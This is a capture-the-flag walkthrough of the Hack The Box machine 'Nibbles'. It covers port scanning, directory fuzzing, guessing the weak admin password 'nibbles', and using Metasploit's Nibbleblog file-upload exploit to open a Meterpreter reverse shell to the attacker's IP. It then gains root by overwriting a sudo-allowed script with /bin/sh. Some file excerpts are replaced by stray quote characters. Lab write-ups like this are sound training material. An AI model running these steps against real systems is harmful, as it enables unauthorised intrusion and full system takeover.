# Nibbles

add nibbles.htb along with ip address in the `/etc/hosts` file

## Nmap Scanning

```

sudo nmap -sS -sC 10.10.10.75
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 08:00 EDT
Nmap scan report for 10.10.10.75
Host is up (0.76s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 36.80 seconds
```

Open browser, move to nibbles.htb, check for source code, got name of directory '/nibbleblog/'

## Fuzzing directory

```

ffuf -u http://nibbles.htb/nibbleblog/FUZZ -w /usr/share/wordlists/dirb/common.txt:FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://nibbles.htb/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 306, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 306, Words: 22, Lines: 12]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61]
.hta                    [Status: 403, Size: 301, Words: 22, Lines: 12]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```

We got a admin login page at admin.php

in `content > private < users.xml `, we got 

```

<users>
  <user username="admin">
      <id type="integer">0</id>
      <session_fail_count type="integer">0</session_fail_count>
      <session_date type="integer">1625662667</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
     <date type="integer">1512964659</date>
     <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.17.124">
     <date type="integer">1625660789</date>
     <fail_count type="integer">5</fail_count>
  </blacklist>
 </users>
```

in ` content > private > config.xml`, we got
```

<config>
   <name type="string">Nibbles</name>
   <slogan type="string">Yum yum</slogan>
   <footer type="string">Powered by Nibbleblog</footer>
   <advanced_post_options type="integer">0</advanced_post_options>
   <url type="string">http://10.10.10.134/nibbleblog/</url>
   " " " "  "  " "  " " " " " "  "  " "  " " " " " "  "  " "  " "
   <friendly_urls type="integer">0</friendly_urls>
   <default_homepage type="integer">0</default_homepage>
</config>
```

### trial and error for passwords

password could be 
```
admin
password
nibbles
Yum yum
```

or one of them with different case (Admin or Nibbles)

it worked with `admin : nibbles`

## Gaining access

either we can upload a shell by modifying plugin or we can use metasploit

### Metsaploit

```

msf6 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting        Required  Description
   ----       ---------------        --------  -----------
   PASSWORD                          yes       The password to authenticate with
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                     yes       The target port (TCP)
   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                      yes       The base path to the web application
   USERNAME                          yes       The username to authenticate with
   VHOST                             no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/
targeturi => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.17.124:4444 
[*] Sending stage (39282 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.17.124:4444 -> 10.10.10.75:37084) at 2021-07-07 08:58:02 -0400

meterpreter > dir
Listing: /var/www/html/nibbleblog/content/private/plugins/my_image
==================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  258   fil   2021-07-07 08:57:49 -0400  db.xml

meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2017-12-29 05:54:16 -0500  nibbler

meterpreter > cd nibbler

meterpreter > cat user.txt
*******************************

meterpreter > cd /root
[-] stdapi_fs_chdir: Operation failed: 1
meterpreter > shell
Process 1849 created.
Channel 1 created.
```

## Privilege escalation

```

python3 -c "import pty; pty.spawn('/bin/bash')"

nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$
```

we can run monitor.sh as root

```

nibbler@Nibbles:/home/nibbler$ ls -l
ls -l
total 8
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Jul  7 08:00 user.txt

nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  

nibbler@Nibbles:/home/nibbler$ cd personal/stuff
cd personal/stuff

nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
ls
monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

"""""""""""""""""""""""""""""' """"""""""""""""""""""""""""""""""""""" """""""""""""""""""""""""""""""""""""""" "       
```

we can change the content of the monitir.sh with '/bin/sh' and run it as root to get root shell

```

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/sh' > monitor.sh
echo '/bin/sh' > monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
chmod +x monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
#
```

got root shell 

```

# cat /root/root.txt
cat /root/root.txt
********************************
# 
```

   
